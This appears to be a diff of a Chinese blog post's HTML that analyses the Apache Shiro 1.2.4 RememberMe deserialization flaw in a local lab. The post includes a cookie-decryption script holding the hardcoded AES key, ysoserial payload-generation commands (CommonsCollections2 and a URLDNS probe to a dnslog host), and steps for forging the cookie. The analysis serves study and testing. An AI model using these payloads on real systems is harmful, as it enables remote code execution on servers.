class="line">            log.info(<span class="string">&quot;Sorry, you aren&#x27;t allowed to drive the &#x27;eagle5&#x27; winnebago!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//all done - log out!</span></span><br><span class="line">        currentUser.logout();</span><br><span class="line"></span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>Demo中对session和用户的登录，角色，权限进行了测试，对照运行的输出<br><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321145837383.png" alt="image-20200321145837383"></p>
+<p>Demo中对session和用户的登录，角色，权限进行了测试，对照运行的输出</p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321145837383.png" class="" title="image-20200321145837383">
+
+
+
 <h2 id="动调环境搭建"><a href="#动调环境搭建" class="headerlink" title="动调环境搭建"></a>动调环境搭建</h2><p>下载Shiro并切换到漏洞版本</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git  </span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>
 
@@ -305,16 +327,24 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>然后用idea导入shiro&#x2F;samples&#x2F;web项目，等待idea自动下载导入项目依赖的包</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321161842461.png" alt="image-20200321161842461"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321161842461.png" class="" title="image-20200321161842461">
+
 <p>然后Run -&gt; Edit Configurations 添加TomcatServer</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162413295.png" alt="image-20200321162413295"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162413295.png" class="" title="image-20200321162413295">
+
 <p>设置Tomcat路径并添加Artifact</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162537299.png" alt="image-20200321162537299"></p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162602475.png" alt="image-20200321162602475"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162537299.png" class="" title="image-20200321162537299">
+
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162602475.png" class="" title="image-20200321162602475">
+
 <p>然后就可以调试运行了</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162720187.png" alt="image-20200321162720187"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321162720187.png" class="" title="image-20200321162720187">
+
+
+
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-550">[SHIRO-550] Randomize default remember me cipher - ASF JIRA</a>的描述已经比较清楚了</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321163758120.png" alt="image-20200321163758120"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321163758120.png" class="" title="image-20200321163758120">
+
 <ul>
 <li>检索<code>RememberMe</code> cookie 的值</li>
 <li>Base 64解码</li>
@@ -322,63 +352,87 @@
 <li>使用Java序列化（<code>ObjectInputStream</code>）反序列化</li>
 </ul>
 <p>在登录时勾选<code>RememberMe</code></p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170531049.png" alt="image-20200321170531049"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170531049.png" class="" title="image-20200321170531049">
+
 <p>然后cookie中就会储存<code>RememberMe</code>键值对</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170728781.png" alt="image-20200321170728781"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321170728781.png" class="" title="image-20200321170728781">
+
 <p>解密AES需要密钥还有mode（加解密算法）和 IV（初始化向量），而由官网得知<code>RememberMe</code>在CookieRememberMeManager实现</p>
 <p>idea中ctrl+n搜索该类名可以快速定位</p>
 <p>org.apache.shiro.web.mgt.CookieRememberMeManager</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321172033719.png" alt="image-20200321172033719"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321172033719.png" class="" title="image-20200321172033719">
+
 <p>该类继承自AbstractRememberMeManager</p>
 <p>org.apache.shiro.mgt.AbstractRememberMeManager</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321174309740.png" alt="image-20200321174309740"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321174309740.png" class="" title="image-20200321174309740">
+
 <p>很容易发现默认的Key是硬编码在其中的，这也是该反序列得以利用的关键，如果再确定mode和IV则可以构造<code>RememberMe</code>的值，然后让其反序列化</p>
 <h3 id="序列化、加密过程"><a href="#序列化、加密过程" class="headerlink" title="序列化、加密过程"></a>序列化、加密过程</h3><p>在org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin下断点，然后开始Debug</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201103424.png" alt="image-20200321201103424"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201103424.png" class="" title="image-20200321201103424">
+
 <p>在登录界面勾选Remember Me并登录</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201229223.png" alt="image-20200321201229223"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201229223.png" class="" title="image-20200321201229223">
+
 <p>登录成功即会在onSuccessfulLogin断点处停下</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201833615.png" alt="image-20200321201833615"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321201833615.png" class="" title="image-20200321201833615">
+
 <p>85行则对rememberMe的值进行判断，如果登录时勾选了则为true，然后进入</p>
 <p>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202502782.png" alt="image-20200321202502782"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202502782.png" class="" title="image-20200321202502782">
+
 <p>94行获取身份即 root，然后进入</p>
 <p>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202614429.png" alt="image-20200321202614429"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202614429.png" class="" title="image-20200321202614429">
+
 <p>103行将用户身份转换为byte[]，跟入看一下</p>
 <p>org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202938567.png" alt="image-20200321202938567"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321202938567.png" class="" title="image-20200321202938567">
+
 <p>在这个函数里将用户身份进行了序列化和加密，最后返回的是密文byte[]</p>
 <p>继续跟入序列化的处理流程的话</p>
 <p>org.apache.shiro.io.DefaultSerializer#serialize</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321203344204.png" alt="image-20200321203344204"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321203344204.png" class="" title="image-20200321203344204">
+
 <p>采用的是java原生的序列化方法writeObject，而最后序列化的数据也就是代表用户身份的SimplePrincipalCollection类的实例，该类实现的接口的父辈接口继承了Serializable接口</p>
 <p>返回去接着看加密过程</p>
 <p>org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204401719.png" alt="image-20200321204401719"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204401719.png" class="" title="image-20200321204401719">
+
 <p>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204557024.png" alt="image-20200321204557024"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321204557024.png" class="" title="image-20200321204557024">
+
 <p>154行得到一个用来加密的CipherService对象，跟入会发现返回的是当前类的<code>private CipherService cipherService = new AesCipherService();</code>并且在AesCipherService父类完成CipherService对象的初始化，此时就确定了AES加密方式及mod</p>
 <p>在当前Debug处就可以看到该对象的信息，比如mod，这里采用的是CBC</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205506865.png" alt="image-20200321205506865"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205506865.png" class="" title="image-20200321205506865">
+
+
+
 <p>接着到了156行，cipherService.encrypt方法第一个参数是序列化后的字节数组，第二个参数即是加AES的key</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205933941.png" alt="image-20200321205933941"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205933941.png" class="" title="image-20200321205933941">
+
 <p>这里的key是在AbstractRememberMeManager类的构造函数里完成初始化，其值就是硬编码的key</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205846991.png" alt="image-20200321205846991"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321205846991.png" class="" title="image-20200321205846991">
+
+
+
 <p>跟入cipherService.encrypt</p>
 <p>org.apache.shiro.crypto.JcaCipherService#encrypt</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321210454929.png" alt="image-20200321210454929"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321210454929.png" class="" title="image-20200321210454929">
+
 <p>在147行跟入的话会发现IV是随机生成的，接着在153行，传入this.encrypt的参数分别是序列化数据，AES的key，AES的IV和一个值为true的布尔值，跟入</p>
 <p>org.apache.shiro.crypto.JcaCipherService#encrypt</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212123639.png" alt="image-20200321212123639"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212123639.png" class="" title="image-20200321212123639">
+
 <p>在162行将16字节的IV放入了output，接着放入密文数据，最后返回Util.bytes(output)</p>
 <p>后面一直return到</p>
 <p>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212426443.png" alt="image-20200321212426443"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212426443.png" class="" title="image-20200321212426443">
+
 <p>加密过程结束</p>
 <p>然后回到</p>
 <p>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212650537.png" alt="image-20200321212650537"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321212650537.png" class="" title="image-20200321212650537">
+
 <p>这里可知前文中</p>
 <blockquote>
 <p>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity103行将用户身份转换为byte[]</p>
@@ -386,31 +440,42 @@
 <p>的byte[]即为<code>随机16字节IV+AES密文</code></p>
 <p>跟进this.rememberSerializedIdentity</p>
 <p>org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321213458543.png" alt="image-20200321213458543"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321213458543.png" class="" title="image-20200321213458543">
+
 <p>其中将前文的<code>随机16字节IV+AES密文</code>byte[]进行了base64编码，并且最后设置成键为rememberMe的Cookie</p>
 <p>可以验证一下确实如此</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321214045866.png" alt="image-20200321214045866"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321214045866.png" class="" title="image-20200321214045866">
+
+
+
 <h3 id="解密、反序列化过程"><a href="#解密、反序列化过程" class="headerlink" title="解密、反序列化过程"></a>解密、反序列化过程</h3><p>在org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity打下断点，然后从cookie中删除JSESSIONID只保留rememberMe刷新网页，或者发送只有rememberMe的请求</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321220720903.png" alt="image-20200321220720903"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321220720903.png" class="" title="image-20200321220720903">
+
 <p>cookie等信息都在subjectContext对象中，跟入rmm.getRememberedPrincipals</p>
 <p>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221012855.png" alt="image-20200321221012855"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221012855.png" class="" title="image-20200321221012855">
+
 <p>跟入this.getRememberedSerializedIdentity</p>
 <p>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221502601.png" alt="image-20200321221502601"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221502601.png" class="" title="image-20200321221502601">
+
 <p>在其中提取了cookie并进行base64解码</p>
 <p>回到getRememberedPrincipals并跟入this.convertBytesToPrincipals</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221616027.png" alt="image-20200321221616027"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221616027.png" class="" title="image-20200321221616027">
+
 <p>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221705778.png" alt="image-20200321221705778"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321221705778.png" class="" title="image-20200321221705778">
+
 <p>在137行进行AES解密，跟入的话，其实就是提取前16位作为iv，然后前文的默认key来进行解密</p>
 <p>140行则进行反序列化</p>
 <p>org.apache.shiro.io.DefaultSerializer#deserialize</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321222156614.png" alt="image-20200321222156614"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321222156614.png" class="" title="image-20200321222156614">
+
 <p>看到readObject便就结束了</p>
 <h3 id="cookie解密及伪造脚本"><a href="#cookie解密及伪造脚本" class="headerlink" title="cookie解密及伪造脚本"></a>cookie解密及伪造脚本</h3><h4 id="cookie解密"><a href="#cookie解密" class="headerlink" title="cookie解密"></a>cookie解密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pip install pycrypto</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">mode =  AES.MODE_CBC</span><br><span class="line">IV   = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line"><span class="built_in">print</span>(encryptor.decrypt(base64.b64decode(sys.argv[<span class="number">1</span>])))</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321224754536.png" alt="image-20200321224754536"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321224754536.png" class="" title="image-20200321224754536">
+
 <p>可以看到从第二行开始就是SimplePrincipalCollection对象的序列化数据</p>
 <p>但脚本中并未使用真正的IV，而是一个错误值，其实在AES CBC解密中IV只会用于对第一个块进行解密，其他块的解密则是使用上一块的加密二进制作为IV进行解密操作，加密的时候，IV会影响所有数据的加密结果，而解密时，IV只会影响第一个加密块的解密结果</p>
 <p>而cookie中的第一段是加密时所用的IV，所以在这里解错并无影响，下文构造cookie时也是由自己随意构造IV就可</p>
@@ -419,22 +484,33 @@
 <p>IV随机生成，序列化的payload用base64格式传入</p>
 <p>生成payload（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lykm02/p/4479098.html">sed去除换行符</a>）</p>
 <p><code>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections2 &quot;calc&quot;|base64 |sed &#39;:label;N;s/\n//;b label&#39; </code></p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235149421.png" alt="image-20200321235149421"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235149421.png" class="" title="image-20200321235149421">
+
 <p>伪造cookie</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235309952.png" alt="image-20200321235309952"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235309952.png" class="" title="image-20200321235309952">
+
+
+
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="DNS-gadget验证漏洞"><a href="#DNS-gadget验证漏洞" class="headerlink" title="DNS gadget验证漏洞"></a>DNS gadget验证漏洞</h3><p>在不知服务器含有哪些组件或者说不知道有哪些可用利用链时，可以ysoserial的URLDNS gadget进行漏洞验证，参数改成dns地址，测试能收到DNS请求。不过Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。URLDNS gadget不需要其他类的支持，它的Gadget Chain：</p>
 <blockquote>
 <p>*   Gadget Chain:<br>*     HashMap.readObject()<br>*       HashMap.putVal()<br>*         HashMap.hash()<br>*           URL.hashCode()</p>
 </blockquote>
 <p><code>java -jar ysoserial-master-30099844c6-1.jar URLDNS &quot;http://dx7yuq.dnslog.cn&quot; |base64 |sed &#39;:label;N;s/\n//;b label&#39;</code></p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000638321.png" alt="image-20200322000638321"></p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000820672.png" alt="image-20200322000820672"></p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000851697.png" alt="image-20200322000851697"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000638321.png" class="" title="image-20200322000638321">
+
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000820672.png" class="" title="image-20200322000820672">
+
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322000851697.png" class="" title="image-20200322000851697">
+
+
+
 <h3 id="commons-collections4"><a href="#commons-collections4" class="headerlink" title="commons-collections4"></a>commons-collections4</h3><p>由于前文搭建环境时已经添加了commons-collections4，所以利用ysoserial的CommonsCollections2即可</p>
 <p><code>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections2 &quot;calc&quot;|base64 |sed &#39;:label;N;s/\n//;b label&#39; </code></p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235751863.png" alt="image-20200321235751863"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200321235751863.png" class="" title="image-20200321235751863">
+
 <h3 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h3><p>运行<code>mvn dependency:list</code>可以查看所有依赖</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322003851696.png" alt="image-20200322003851696"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322003851696.png" class="" title="image-20200322003851696">
+
 <p>其中就有commons-collections3.2.1</p>
 <p>直接用ysoserial生成payload攻击会出错，原因是</p>
 <blockquote>
@@ -449,7 +525,8 @@
 <p>The remaining payloads in ysoserial depend on classes that were not present in our target system :&#x2F; So looks like we cannot give parameters to method calls nor chain method calls to one another. Is all hope of succesful exploitation lost?</p>
 </blockquote>
 <p>解决这种问题的办法是使用JRMP</p>
